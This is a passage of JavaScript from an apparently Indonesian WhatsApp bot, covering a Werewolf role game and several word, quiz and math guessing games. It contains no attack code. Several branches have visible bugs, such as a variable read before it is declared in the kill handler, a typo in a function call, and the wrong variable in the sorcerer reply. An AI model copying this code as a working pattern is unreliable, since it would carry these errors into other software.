        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${znn.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await znn.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${znn.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await znn.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${znn.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await znn.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${znn.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await znn.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${znn.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await znn.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await znn.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "https://chat.whatsapp.com/DZ3vdQavh4e97rpK99Eepe",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(znn. chat, ww);
    } else      if (value === "kill") { 
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return m.reply("Peran ini bukan untuk kamu"); 
         if (byId.db.role === "sorcerer") 
             return m.reply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
      reply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         reply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return m.reply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                znn.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://chat.whatsapp.com/DZ3vdQavh4e97rpK99Eepe",
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        znn.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://chat.whatsapp.com/DZ3vdQavh4e97rpK99Eepe",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += `  ww create\n`;
        text += `  ww join\n`;
        text += `  ww start\n`;
        text += `  ww exit\n`;
        text += `  ww delete\n`;
        text += `  ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        znn.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.saluran}`,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
case 'suit':
if(!isGroup) return onlyGroup()
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return reply795(`Selesaikan suit mu yang sebelumnya`)
mark = `0@s.whatsapp.net`
if (!froms) return reply795(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return reply795(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply795(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return reply795(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
let poin = 10
let poin_lose = 10
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await znn.sendteks(from, `@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit\n\n*Kirim (gas/gamau)* untuk bermain\n\nHadiah : ${hadiah} balance`, m),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) znn.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return onlyGroup()
if (from in tictactoe) return reply795(`Masih ada game yang blum selesai`)
if (!froms) return reply795(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return reply795(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply795(`Sad amat main ama diri sendiri`)
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
await reply795(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (!m.isGroup) return onlyGroup()
if (!(from in tictactoe)) return reply795(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break
case 'petakbom':
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (sender in petakbom) return reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await reply795(`*PETAK BOM*

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
break
case 'delpetakbom':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (!(sender in petakbom)) return reply795(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
znn.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
reply(`Petakbom di akhiri, hadiah Rp. 0`)
break
case 'tebakgambar':
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
//if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply795('Masih ada game yang belum diselesaikan');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await znn.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar[from]) reply795(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
case 'tebakanime':
//if(!isGroup) return onlyGroup()
if (from in tebakanime) return reply795('Masih ada game yang belum diselesaikan');
var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await znn.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) reply795(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebaklagu) return reply795('Masih ada game yang belum diselesaikan');
var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return reply795('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await znn.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {znn.sendteks(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) reply795(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in kuis) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakkalimat) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (from in tebakkata) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebaklirik) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
//if(!isGroup) return onlyGroup()
if (from in tebakkimia) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) reply795(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakbendera) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in susunkata) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break
case 'asahotak':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in asahotak) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in siapakahaku) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in caklontong) return reply795('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await reply795(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) reply795(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
//if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in kuismath) return reply795('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./assets/game/math')
if (!q) return reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return reply795('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await reply795(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) reply795(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
